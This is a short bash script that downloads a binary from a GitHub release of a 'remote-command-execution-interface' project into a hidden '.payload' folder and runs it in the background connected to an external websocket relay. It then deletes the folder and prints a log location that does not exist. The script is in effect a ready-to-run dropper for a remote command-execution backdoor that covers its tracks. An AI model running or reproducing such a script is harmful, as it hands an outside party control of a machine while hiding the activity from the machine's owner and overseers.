#!/bin/bash

set -e

# --- Config ---
RELEASE_NAME="v6-0e4ce2209eae9fa6a069200dc92cad4297be6e35"

BASE_URL="https://github.com/zaqks/remote-command-execution-interface/releases/download/${RELEASE_NAME}"

WORKDIR=".payload"

AGENT_NAME="relay-agent"

RELAY_HOST_WS="wss://zaqks-relay.hf.space"
LOCAL_PORT="8888"

# --- Setup ---
mkdir -p "$WORKDIR"
cd "$WORKDIR"

wget -O "$AGENT_NAME" "${BASE_URL}/main.bin"

chmod +x "$AGENT_NAME"

# --- Run in background ---
nohup "./$AGENT_NAME" \
  --local-port "$LOCAL_PORT" \
  --relay-host-ws "$RELAY_HOST_WS" &

echo "Started relay-agent in background. Logs: $WORKDIR/run.log"

cd ..
rm -rf "$WORKDIR"